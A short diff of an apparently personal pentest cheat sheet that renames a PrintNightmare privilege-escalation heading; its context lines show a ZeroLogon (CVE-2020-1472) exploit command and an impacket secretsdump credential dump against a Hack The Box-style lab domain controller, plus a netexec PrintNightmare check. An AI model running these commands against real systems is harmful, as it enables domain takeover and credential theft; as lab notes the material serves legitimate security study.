@@ -320,7 +320,7 @@ Exploit:
 python3 cve-2020-1472-exploit.py Monteverde(dc-name) 10.10.10.172(dc-ip)
 impacket-secretsdump 'megabank.local'/'Monteverde$'@10.10.10.172 -just-dc -no-pass 
 ```
-### Domain Priviledge Escalation By Printnightmare CVE-2021-1675 CVE-2021-34527
+### Windows Priviledge Escalation By Printnightmare CVE-2021-1675 CVE-2021-34527
 ```
 Detect:
 nxc smb ip -u username -p pass -M printnightmare
